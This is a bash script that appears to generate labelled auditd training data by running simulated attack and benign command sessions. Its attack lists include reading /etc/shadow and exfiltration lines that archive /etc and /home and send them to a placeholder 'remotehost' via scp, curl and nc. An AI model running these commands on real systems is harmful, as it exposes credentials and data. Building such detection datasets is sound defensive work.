#!/bin/bash

ATTACK_SESSIONS=$1
BENIGN_SESSIONS=$2

echo "Attack Sessions: $ATTACK_SESSIONS"
echo "Benign Sessions: $BENIGN_SESSIONS"

# Function to introduce random delay
delay() {
    read -t $((RANDOM % $1 + 20))
}

ATTACK_TYPES=("Reconnaissance" "Privilege Escalation" "Persistence" "Data Exfiltration")

# Assign commands to each attack type
RECONNAISSANCE=(
    "ip addr"
    "netstat -tuln"
    "ss -tuln"
    "lsblk"
    "df -h"
    "whoami"
    "id"
    "uname -a"
    "find / -type f -perm -4000"
    "arp -a"
    "ip addr"
    "service --status-all"
    "nmap -sS -O localhost"
)

PRIVILEGE_ESCALATION=(
    "sudo -l"
    "cat /etc/passwd"
    "cat /etc/shadow"
    "ls -la /root"
    "find / -perm -4000 -exec ls -ldb {} 2>/dev/null \\;"
)

PERSISTENCE=(
    "crontab -l"
    "ls -la /etc/cron.*"
    "systemctl list-timers --all"
    "cat ~/.bashrc"
    "cat ~/.profile"
    "ls -la /etc/rc.local"
)

DATA_EXFILTRATION=(
    "tar -czf /tmp/data.tar.gz /etc /home"
    "scp /tmp/data.tar.gz user@remotehost:/path"
    "curl -T /tmp/data.tar.gz ftp://remotehost --user user:password"
    "nc -w 3 remotehost 1234 < /tmp/data.tar.gz"
)

BENIGN_COMMANDS=(
    "ls -la"
    "pwd"
    "git status"
    "python3 --version"
    "pip3 list"
    "which python3"
    "uptime"
    "df -h"
    "free -h"
    "systemctl status ssh"
    "journalctl -n 10"
    "curl --version"
    "man ls"
)

# Select a random attack type
chosen_attack_type() {
    local index=$((RANDOM % ${#ATTACK_TYPES[@]}))
    echo "${ATTACK_TYPES[$index]}"
}

# Benign activity simulation
benign_simulation() {
    echo "Running Benign Activity Simulation"

    local num_commands=$((RANDOM % 11 + 5))

    for ((i=0; i < num_commands; i++)); do

        local start_date=$(date +%x)
        local start_time=$(date +%H:%M:%S)

        local rand_index=$((RANDOM % ${#BENIGN_COMMANDS[@]}))
        echo "Benign command: ${BENIGN_COMMANDS[$rand_index]}"
        eval "${BENIGN_COMMANDS[$rand_index]} >/dev/null 2>&1"
        delay 5

        local end_date="$(date +%x)"
        local end_time="$(date +%H:%M:%S)"

        while IFS= read -r line; do
	    echo $line
            echo "BENIGN \"$line\"" >> training_data.txt
        done < <(sudo ausearch -ts $start_date $start_time -te $end_date $end_time -i 2>/dev/null)
    done

    echo "Benign activity ended at $(date -d $end_time)"

    echo "Completed Benign Activity Simulation"
}

# Main attack simulation function
attack_simulation() {
    echo "Running Attack Simulation"

    local chosen_attack=$(chosen_attack_type)

    case $chosen_attack in
            "Reconnaissance")
                local commands=("${RECONNAISSANCE[@]}")
                ;;
            "Privilege Escalation")
                local commands=("${PRIVILEGE_ESCALATION[@]}")
                ;;
            "Persistence")
                local commands=("${PERSISTENCE[@]}")
                ;;
            "Data Exfiltration")
                local commands=("${DATA_EXFILTRATION[@]}")
                ;;
            *)
                echo "Unknown attack type: $chosen_attack"
                continue
                ;;
        esac
    
    echo "Chosen attack type: $chosen_attack"

    # Generate random number of commands from 5 to 15
    
    local rand_number_commands=$((RANDOM % 11 + 5))



    # Shuffle commands
    for ((i=0; i < rand_number_commands; i++)); do

        local start_date=$(date +%x)
        local start_time=$(date +%H:%M:%S)

        local rand_index=$((RANDOM % ${#commands[@]}))
        echo "Commands ran: ${commands[$rand_index]}"
        eval "${commands[$rand_index]} >/dev/null 2>&1"
        delay 5

        local end_date="$(date +%x)"
        local end_time="$(date +%H:%M:%S)"

        while IFS= read -r line; do
            echo $line
            echo "${chosen_attack^^} \"$line\"" >> training_data.txt
        done < <(sudo ausearch -ts $start_date $start_time -te $end_date $end_time -i 2>/dev/null)

        tail -n 1 training_data.txt

    done

    echo "Completed attack session"
}

main() {
    echo "Eason Fantastic Auditd Attack Simulation Script"
    echo "Starting simulation at $(date)"


    if ! sudo -n true 2>/dev/null; then
        echo "Need sudo privileges to run this script for ausearch."
        echo sudo su
    fi

    ALL_SESSIONS=()

    # Add Attack Sessions
    for ((i=0; i<ATTACK_SESSIONS; i++)); do
        ALL_SESSIONS+=("ATTACK")
    done

    # Add Benign Sessions
    for ((i=0; i<BENIGN_SESSIONS; i++)); do
        ALL_SESSIONS+=("BENIGN")
    done

    local shuffled_sessions=($(printf '%s\n' "${ALL_SESSIONS[@]}" | shuf))
    local total_sessions=${#shuffled_sessions[@]}

    echo "Total Sessions to run: $total_sessions"
    echo "The order of sessions to run: ${shuffled_sessions[*]}"
    echo ""

    # Run the sessions in random order 
    for ((session=1; session<=total_sessions; session++)); do
        local session_type="${shuffled_sessions[session-1]}"
        echo "Starting session $session of $total_sessions: $session_type"
        
        if [ "$session_type" == "ATTACK" ]; then
            attack_simulation vnv   
        else
            benign_simulation
        fi

        echo "Completed session $session of $total_sessions: $session_type"
        echo ""
        
        # Delay between sessions
        if [ $session -lt $total_sessions ]; then
            echo "Pausing before next session..."
            delay 60
        fi
    done

    echo "Simulation completed at $(date)"
    echo "Output at $(pwd)/training_data.txt"
    echo "Total number of lines: $(wc -l < training_data.txt)"
}

main
